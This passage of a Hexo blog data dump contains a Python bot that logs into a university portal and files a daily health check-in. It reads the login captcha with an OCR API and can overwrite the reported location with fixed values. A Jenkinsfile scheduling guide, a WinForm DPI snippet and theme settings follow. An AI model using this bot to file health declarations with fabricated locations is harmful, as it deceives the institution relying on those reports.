class=\"string\">&#x27;[ak]&#x27;</span>, self.api_key).replace(<span class=\"string\">&#x27;[sk]&#x27;</span>, self.secret_key)</span><br><span class=\"line\">        response = requests.get(api)</span><br><span class=\"line\">        access_token = response.json()[<span class=\"string\">&#x27;access_token&#x27;</span>]</span><br><span class=\"line\">        request_url = URL_MAP[<span class=\"string\">&#x27;REQUEST_URL&#x27;</span>] + <span class=\"string\">&quot;?access_token=&quot;</span> + access_token</span><br><span class=\"line\">        api_headers = &#123;<span class=\"string\">&#x27;content-type&#x27;</span>: <span class=\"string\">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;</span><br><span class=\"line\">        response = requests.post(request_url, data=&#123;<span class=\"string\">&#x27;image&#x27;</span>: img&#125;, headers=api_headers)</span><br><span class=\"line\">        captcha = response.json()[<span class=\"string\">&#x27;words_result&#x27;</span>][<span class=\"number\">0</span>][<span class=\"string\">&#x27;words&#x27;</span>]</span><br><span class=\"line\">        captcha = str(captcha.replace(<span class=\"string\">&#x27;=?&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>)).split(<span class=\"string\">&#x27;+&#x27;</span>)</span><br><span class=\"line\">        captcha = sum(map(int, captcha))</span><br><span class=\"line\">        self.logger.info(<span class=\"string\">&#x27;验证码识别成功!&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 构造表单</span></span><br><span class=\"line\">        token = ast.literal_eval(req.content.decode(<span class=\"string\">&#x27;utf-8&#x27;</span>))[<span class=\"string\">&#x27;token&#x27;</span>]</span><br><span class=\"line\">        account = ast.literal_eval(user[<span class=\"number\">1</span>])</span><br><span class=\"line\">        formdata = &#123;</span><br><span class=\"line\">            <span class=\"string\">&#x27;username&#x27;</span>: account[<span class=\"number\">0</span>],</span><br><span class=\"line\">            <span class=\"string\">&#x27;password&#x27;</span>: account[<span class=\"number\">1</span>],</span><br><span class=\"line\">            <span class=\"string\">&#x27;_eventId&#x27;</span>: <span class=\"string\">&#x27;submit&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;token&#x27;</span>: token</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        formdata.update(&#123;f[<span class=\"string\">&#x27;name&#x27;</span>]: f[<span class=\"string\">&#x27;value&#x27;</span>] <span class=\"keyword\">for</span> f <span class=\"keyword\">in</span> form&#125;)</span><br><span class=\"line\">        formdata.update(&#123;<span class=\"string\">&#x27;captcha&#x27;</span>: captcha&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 登录</span></span><br><span class=\"line\">        req = self.sessions.post(URL_MAP[<span class=\"string\">&#x27;LOGIN&#x27;</span>], headers=HEADERS, data=formdata)</span><br><span class=\"line\">        soup = BeautifulSoup(req.content, features=<span class=\"string\">&#x27;html.parser&#x27;</span>)</span><br><span class=\"line\">        errormes = soup.find(<span class=\"string\">&#x27;span&#x27;</span>, id=<span class=\"string\">&#x27;errormes&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> errormes:</span><br><span class=\"line\">            self.logger.error(errormes[<span class=\"string\">&#x27;value&#x27;</span>])</span><br><span class=\"line\">            <span class=\"keyword\">raise</span> Exception(errormes[<span class=\"string\">&#x27;value&#x27;</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 检测登录状态</span></span><br><span class=\"line\">        url = self.sessions.get(URL_MAP[<span class=\"string\">&#x27;HOST&#x27;</span>], headers=HEADERS).url</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> url == URL_MAP[<span class=\"string\">&#x27;HOST&#x27;</span>]:</span><br><span class=\"line\">            self.logger.error(<span class=\"string\">&#x27;登录失败, 未知错误!&#x27;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">raise</span> Exception(<span class=\"string\">&#x27;登录失败, 未知错误!&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            self.logger.info(<span class=\"string\">&#x27;使用账号密码登录成功!&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">    @retry(stop_max_attempt_number=3)</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">post</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        <span class=\"string\">&quot;&quot;&quot;打卡&quot;&quot;&quot;</span></span><br><span class=\"line\">        self.logger.info(<span class=\"string\">&#x27;打卡进行中...&#x27;</span>)</span><br><span class=\"line\">        req = self.sessions.get(URL_MAP[<span class=\"string\">&#x27;HOST&#x27;</span>], headers=HEADERS)</span><br><span class=\"line\">        soup = BeautifulSoup(req.content, features=<span class=\"string\">&#x27;html.parser&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 构造表单</span></span><br><span class=\"line\">        csrf = soup.find(<span class=\"string\">&#x27;meta&#x27;</span>, itemscope=<span class=\"string\">&#x27;csrfToken&#x27;</span>)[<span class=\"string\">&#x27;content&#x27;</span>]</span><br><span class=\"line\">        formdata = &#123;</span><br><span class=\"line\">            <span class=\"string\">&#x27;idc&#x27;</span>: <span class=\"string\">&#x27;XSMRJKSB&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;release&#x27;</span>: <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;csrfToken&#x27;</span>: csrf,</span><br><span class=\"line\">            <span class=\"string\">&#x27;formData&#x27;</span>: <span class=\"string\">&#x27;&#123;&quot;_VAR_URL&quot;:&quot;https://ehall.hpu.edu.cn/infoplus/form/XSMRJKSB/start&quot;,&quot;_VAR_URL_Attr&quot;:&quot;&#123;&#125;&quot;&#125;&#x27;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        req = self.sessions.post(URL_MAP[<span class=\"string\">&#x27;START&#x27;</span>], headers=HEADERS, data=formdata)</span><br><span class=\"line\">        url = req.json()[<span class=\"string\">&#x27;entities&#x27;</span>][<span class=\"number\">0</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 构造表单</span></span><br><span class=\"line\">        stepid = int(re.findall(<span class=\"string\">r&#x27;\\d+&#x27;</span>, url)[<span class=\"number\">0</span>])</span><br><span class=\"line\">        self.logger.info(<span class=\"string\">&#x27;开始流程%s中...&#x27;</span>, stepid)</span><br><span class=\"line\">        formdata = &#123;</span><br><span class=\"line\">            <span class=\"string\">&#x27;stepId&#x27;</span>: stepid,</span><br><span class=\"line\">            <span class=\"string\">&#x27;instanceId&#x27;</span>: <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;admin&#x27;</span>: <span class=\"string\">&#x27;false&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;rand&#x27;</span>: random.random() * <span class=\"number\">999</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;width&#x27;</span>: <span class=\"string\">&#x27;1747&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;lang&#x27;</span>: <span class=\"string\">&#x27;zh&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;csrfToken&#x27;</span>: csrf</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        HEADERS.update(&#123;<span class=\"string\">&#x27;Referer&#x27;</span>: url&#125;)</span><br><span class=\"line\">        req = self.sessions.post(URL_MAP[<span class=\"string\">&#x27;RENDER&#x27;</span>], headers=HEADERS, data=formdata)</span><br><span class=\"line\">        self.logger.info(<span class=\"string\">&#x27;已加载审批表!&#x27;</span>)</span><br><span class=\"line\">        form = req.json()[<span class=\"string\">&#x27;entities&#x27;</span>][<span class=\"number\">0</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 构造表单</span></span><br><span class=\"line\">        instanceid = form[<span class=\"string\">&#x27;step&#x27;</span>][<span class=\"string\">&#x27;instanceId&#x27;</span>]</span><br><span class=\"line\">        formdata = &#123;</span><br><span class=\"line\">            <span class=\"string\">&#x27;stepId&#x27;</span>: stepid,</span><br><span class=\"line\">            <span class=\"string\">&#x27;includingTop&#x27;</span>: <span class=\"string\">&#x27;true&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;csrfToken&#x27;</span>: csrf,</span><br><span class=\"line\">            <span class=\"string\">&#x27;lang&#x27;</span>: <span class=\"string\">&#x27;zh&#x27;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        req = self.sessions.post(URL_MAP[<span class=\"string\">&#x27;PROCESS&#x27;</span>].replace(<span class=\"string\">&#x27;[id]&#x27;</span>, instanceid), headers=HEADERS, data=formdata)</span><br><span class=\"line\">        self.logger.info(<span class=\"string\">&#x27;审批表处理中...&#x27;</span>)</span><br><span class=\"line\">        timestamp = req.json()[<span class=\"string\">&#x27;entities&#x27;</span>][<span class=\"number\">0</span>][<span class=\"string\">&#x27;remarks&#x27;</span>][<span class=\"number\">0</span>][<span class=\"string\">&#x27;assignTime&#x27;</span>]</span><br><span class=\"line\">        boundfields = <span class=\"string\">&#x27;,&#x27;</span>.join(list(form[<span class=\"string\">&#x27;data&#x27;</span>].keys()))</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 构造表单</span></span><br><span class=\"line\">        postdata = form[<span class=\"string\">&#x27;data&#x27;</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> self.chdata:</span><br><span class=\"line\">            fixdata = &#123;</span><br><span class=\"line\">                <span class=\"string\">&#x27;fieldTXcs&#x27;</span>: <span class=\"string\">&#x27;410800&#x27;</span>,</span><br><span class=\"line\">                <span class=\"string\">&#x27;fieldTXcs_Name&#x27;</span>: <span class=\"string\">&#x27;焦作市&#x27;</span>,</span><br><span class=\"line\">                <span class=\"string\">&#x27;fieldTXdq&#x27;</span>: <span class=\"string\">&#x27;410811&#x27;</span>,</span><br><span class=\"line\">                <span class=\"string\">&#x27;fieldTXdq_Name&#x27;</span>: <span class=\"string\">&#x27;山阳区&#x27;</span>,</span><br><span class=\"line\">                <span class=\"string\">&#x27;fieldTXjtwz&#x27;</span>: <span class=\"string\">&#x27;河南理工大学&#x27;</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            postdata.update(fixdata)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> self.chaddr:</span><br><span class=\"line\">            postdata.update(&#123;<span class=\"string\">&#x27;_VAR_ADDR&#x27;</span>: self.ipaddr&#125;)</span><br><span class=\"line\">        formdata = &#123;</span><br><span class=\"line\">            <span class=\"string\">&#x27;stepId&#x27;</span>: stepid,</span><br><span class=\"line\">            <span class=\"string\">&#x27;actionId&#x27;</span>: <span class=\"number\">1</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;formData&#x27;</span>: str(postdata),</span><br><span class=\"line\">            <span class=\"string\">&#x27;timestamp&#x27;</span>: timestamp,</span><br><span class=\"line\">            <span class=\"string\">&#x27;rand&#x27;</span>: random.random() * <span class=\"number\">999</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;boundFields&#x27;</span>: boundfields,</span><br><span class=\"line\">            <span class=\"string\">&#x27;csrfToken&#x27;</span>: csrf,</span><br><span class=\"line\">            <span class=\"string\">&#x27;lang&#x27;</span>: <span class=\"string\">&#x27;zh&#x27;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        req = self.sessions.post(URL_MAP[<span class=\"string\">&#x27;NEXTSTEP&#x27;</span>], headers=HEADERS, data=formdata)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> req.json()[<span class=\"string\">&#x27;ecode&#x27;</span>] == <span class=\"string\">&#x27;SUCCEED&#x27;</span>:</span><br><span class=\"line\">            self.logger.info(<span class=\"string\">&#x27;健康打卡准备阶段, 成功!&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">raise</span> Exception(<span class=\"string\">&#x27;健康打卡准备阶段, 失败!&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 构造表单</span></span><br><span class=\"line\">        formdata = &#123;</span><br><span class=\"line\">            <span class=\"string\">&#x27;actionId&#x27;</span>: <span class=\"number\">1</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;formData&#x27;</span>: str(form[<span class=\"string\">&#x27;data&#x27;</span>]),</span><br><span class=\"line\">            <span class=\"string\">&#x27;remark&#x27;</span>: <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;rand&#x27;</span>: random.random() * <span class=\"number\">999</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;nextUsers&#x27;</span>: <span class=\"string\">&#x27;&#123;&#125;&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;stepId&#x27;</span>: stepid,</span><br><span class=\"line\">            <span class=\"string\">&#x27;timestamp&#x27;</span>: timestamp,</span><br><span class=\"line\">            <span class=\"string\">&#x27;boundFields&#x27;</span>: boundfields,</span><br><span class=\"line\">            <span class=\"string\">&#x27;csrfToken&#x27;</span>: csrf,</span><br><span class=\"line\">            <span class=\"string\">&#x27;lang&#x27;</span>: <span class=\"string\">&#x27;zh&#x27;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        req = self.sessions.post(URL_MAP[<span class=\"string\">&#x27;DOACTION&#x27;</span>], headers=HEADERS, data=formdata)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> req.json()[<span class=\"string\">&#x27;ecode&#x27;</span>] == <span class=\"string\">&#x27;SUCCEED&#x27;</span>:</span><br><span class=\"line\">            self.logger.info(<span class=\"string\">&#x27;健康打卡填报阶段, 成功!&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">raise</span> Exception(<span class=\"string\">&#x27;健康打卡填报阶段, 失败!&#x27;</span>)</span><br><span class=\"line\">        self.check()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">    @retry(stop_max_attempt_number=3)</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">check</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        <span class=\"string\">&quot;&quot;&quot;打卡完毕后复检&quot;&quot;&quot;</span></span><br><span class=\"line\">        req = self.sessions.get(URL_MAP[<span class=\"string\">&#x27;CHECK&#x27;</span>], headers=HEADERS)</span><br><span class=\"line\">        last_time = req.json()[<span class=\"string\">&#x27;entities&#x27;</span>][<span class=\"number\">0</span>][<span class=\"string\">&#x27;update&#x27;</span>]</span><br><span class=\"line\">        local_time = time.strftime(<span class=\"string\">&quot;%Y/%m/%d %H:%M:%S&quot;</span>, time.localtime(last_time))</span><br><span class=\"line\">        update = round(time.time()) - last_time</span><br><span class=\"line\">        <span class=\"keyword\">if</span> update &gt; <span class=\"number\">5</span>:</span><br><span class=\"line\">            self.logger.error(<span class=\"string\">&#x27;上次打卡完成于%ss前,打卡可能未成功!&#x27;</span>, update)</span><br><span class=\"line\">            <span class=\"keyword\">raise</span> Exception(<span class=\"string\">&#x27;打卡复检状态异常!&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            self.logger.info(<span class=\"string\">&#x27;打卡完成于%s&#x27;</span>, local_time)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    BOT = Bot(<span class=\"string\">&#x27;config.ini&#x27;</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h1 id=\"Coding\"><a href=\"#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h1><h2 id=\"创建项目\"><a href=\"#创建项目\" class=\"headerlink\" title=\"创建项目\"></a>创建项目</h2><p>登录<a href=\"https://e.coding.net/login\">Coding</a>， 进入团队，切换到项目（左边栏点击’项目’），创建项目，选择DevOps项目。</p>\n<h2 id=\"创建代码仓库\"><a href=\"#创建代码仓库\" class=\"headerlink\" title=\"创建代码仓库\"></a>创建代码仓库</h2><p>切换到代码仓库，新建代码仓库，勾选启用READEME.md文件初始化项目，取消启用代码扫描，点击确认。<br><img data-src=\"https://cdn.file.todest.cn/blog/pic/20201205164547.png\" alt=\"\"></p>\n<h2 id=\"上传文件\"><a href=\"#上传文件\" class=\"headerlink\" title=\"上传文件\"></a>上传文件</h2><p>新建文件main.py，将完整代码粘贴进去，点击提交并直接确认。<br><img data-src=\"https://cdn.file.todest.cn/blog/pic/20201205164816.png\" alt=\"\"><br>点击上方浏览返回文件根目录，再次创建文件Jenkinsfile (注: 无文件名后缀，请不要自行发挥)，粘贴下面代码并提交，并重复此步骤将修改好的config.ini上传。<br><figure class=\"highlight yml\"><figcaption><span>Jenkinsfile</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">pipeline</span> &#123;</span><br><span class=\"line\">  <span class=\"string\">agent</span> &#123;</span><br><span class=\"line\">    <span class=\"string\">any</span> &#123;</span><br><span class=\"line\">      <span class=\"string\">reuseNode</span> <span class=\"literal\">true</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"string\">stages</span> &#123;</span><br><span class=\"line\">    <span class=\"string\">stage(&#x27;检出&#x27;)</span> &#123;</span><br><span class=\"line\">      <span class=\"string\">steps</span> &#123;</span><br><span class=\"line\">        <span class=\"string\">checkout(</span>[</span><br><span class=\"line\">          <span class=\"string\">$class:</span> <span class=\"string\">&#x27;GitSCM&#x27;</span>,</span><br><span class=\"line\">          <span class=\"attr\">branches:</span> [[<span class=\"attr\">name:</span> <span class=\"string\">env.GIT_BUILD_REF</span>]],</span><br><span class=\"line\">          <span class=\"attr\">userRemoteConfigs:</span> [[</span><br><span class=\"line\">            <span class=\"attr\">url:</span> <span class=\"string\">env.GIT_REPO_URL</span>,</span><br><span class=\"line\">            <span class=\"attr\">credentialsId:</span> <span class=\"string\">env.CREDENTIALS_ID</span></span><br><span class=\"line\">          ]]]<span class=\"string\">)</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"string\">stage(&#x27;安装依赖&#x27;)</span> &#123;</span><br><span class=\"line\">        <span class=\"string\">steps</span> &#123;</span><br><span class=\"line\">          <span class=\"string\">sh</span> <span class=\"string\">&#x27;&#x27;</span><span class=\"string\">&#x27;pip3 install --upgrade pip</span></span><br><span class=\"line\"><span class=\"string\">pip3 install setuptools</span></span><br><span class=\"line\"><span class=\"string\">pip3 install requests</span></span><br><span class=\"line\"><span class=\"string\">pip3 install bs4</span></span><br><span class=\"line\"><span class=\"string\">pip3 install configparser</span></span><br><span class=\"line\"><span class=\"string\">pip3 install retrying&#x27;</span><span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"string\">stage(&#x27;运行&#x27;)</span> &#123;</span><br><span class=\"line\">        <span class=\"string\">steps</span> &#123;</span><br><span class=\"line\">          <span class=\"string\">sh</span> <span class=\"string\">&#x27;python3 main.py&#x27;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"创建构建计划\"><a href=\"#创建构建计划\" class=\"headerlink\" title=\"创建构建计划\"></a>创建构建计划</h2><p>切换到持续集成-&gt;构建计划，创建构建计划，翻到最下面选择自定义构建过程，代码仓库选择此代码仓库，配置来源勾选上使用代码库中的Jenkinsfile，点击确认。<br><img data-src=\"https://cdn.file.todest.cn/blog/pic/20201205165857.png\" alt=\"\"><br>保存并构建，确认，立即构建，等待构建成功。<br><img data-src=\"https://cdn.file.todest.cn/blog/pic/20201205170328.png\" alt=\"\"></p>\n<h2 id=\"设置定时触发\"><a href=\"#设置定时触发\" class=\"headerlink\" title=\"设置定时触发\"></a>设置定时触发</h2><p>点击右上角的设置修改构建计划的配置，切换到触发规则，添加定时触发，设置好触发的时期时间点击确认。<br><img data-src=\"https://cdn.file.todest.cn/blog/pic/20201205170919.png\" alt=\"\"></p>\n<h2 id=\"完成并查看\"><a href=\"#完成并查看\" class=\"headerlink\" title=\"完成并查看\"></a>完成并查看</h2><p>如果到了这里还没有出现错误的话，那么就基本没问题了，可以在项目概览查看每次定时触发情况。<br><img data-src=\"https://cdn.file.todest.cn/blog/pic/20201205171438.png\" alt=\"\"><br>也可以点击任务ID查看执行日志。<br><img data-src=\"https://cdn.file.todest.cn/blog/pic/20201205171840.png\" alt=\"\"><br>最后，也可以前往<a href=\"https://ehall.hpu.edu.cn/taskcenter/workflow/done\">学校官网</a>查看打卡情况。</p>\n<h2 id=\"邮件通知\"><a href=\"#邮件通知\" class=\"headerlink\" title=\"邮件通知\"></a>邮件通知</h2><p>一般来说，以目前最新的代码，如果构建失败则打卡失败，所以添加构建失败后邮件提醒还是很有必要的。<br>如果想要构建失败后邮件通知的话，需要在个人账户设置-&gt;提醒设置里面开启持续集成（构建）邮件提醒。<br><img data-src=\"https://cdn.file.todest.cn/blog/pic/20201207181947.png\" alt=\"\"><br>并且需要在个人账户设置-&gt;邮箱设置添加想要接收邮件的邮箱并验证邮箱。<br><img data-src=\"https://cdn.file.todest.cn/blog/pic/20201207182447.png\" alt=\"\"><br>同时，在构建计划设置-&gt;通知提醒里面添加成员为自己并修改通知事件为仅失败。<br><img data-src=\"https://cdn.file.todest.cn/blog/pic/20201207182104.png\" alt=\"\"></p>"},{"title":"解决WinForm DPI问题","date":"2020-04-08T08:08:24.000Z","abbrlink":"cc74b154","_content":"更改 Form 的 AutoScaleMode 属性值为 Dpi ，并修改 Program.cs 为以下内容。\n```csharp\nclass Program\n{\n    [STAThread]\n    static void Main()\n    {\n        if (Environment.OSVersion.Version.Major >= 6)\n            SetProcessDPIAware();\n\n        Application.EnableVisualStyles();\n        Application.SetCompatibleTextRenderingDefault(false);\n        Application.Run(new Form1());\n    }\n\n    [System.Runtime.InteropServices.DllImport(\"user32.dll\")]\n    private static extern bool SetProcessDPIAware();\n}\n```","source":"_posts/解决WinForm DPI问题.md","raw":"---\ntitle: 解决WinForm DPI问题\ndate: 2020-04-08 16:08:24\ncategories:\n  - 编程语言\n  - C#\ntags:\n  - GUI\n  - 'C#'\n  - WinForm\nabbrlink: cc74b154\n---\n更改 Form 的 AutoScaleMode 属性值为 Dpi ，并修改 Program.cs 为以下内容。\n```csharp\nclass Program\n{\n    [STAThread]\n    static void Main()\n    {\n        if (Environment.OSVersion.Version.Major >= 6)\n            SetProcessDPIAware();\n\n        Application.EnableVisualStyles();\n        Application.SetCompatibleTextRenderingDefault(false);\n        Application.Run(new Form1());\n    }\n\n    [System.Runtime.InteropServices.DllImport(\"user32.dll\")]\n    private static extern bool SetProcessDPIAware();\n}\n```","slug":"解决WinForm DPI问题","published":1,"updated":"2020-05-11T09:50:49.686Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexke3003yqse55l86hee3","content":"<p>更改 Form 的 AutoScaleMode 属性值为 Dpi ，并修改 Program.cs 为以下内容。<br><figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title\">Program</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    [<span class=\"meta\">STAThread</span>]</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">Main</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (Environment.OSVersion.Version.Major &gt;= <span class=\"number\">6</span>)</span><br><span class=\"line\">            SetProcessDPIAware();</span><br><span class=\"line\"></span><br><span class=\"line\">        Application.EnableVisualStyles();</span><br><span class=\"line\">        Application.SetCompatibleTextRenderingDefault(<span class=\"literal\">false</span>);</span><br><span class=\"line\">        Application.Run(<span class=\"keyword\">new</span> Form1());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    [<span class=\"meta\">System.Runtime.InteropServices.DllImport(<span class=\"meta-string\">&quot;user32.dll&quot;</span>)</span>]</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">extern</span> <span class=\"keyword\">bool</span> <span class=\"title\">SetProcessDPIAware</span>(<span class=\"params\"></span>)</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calen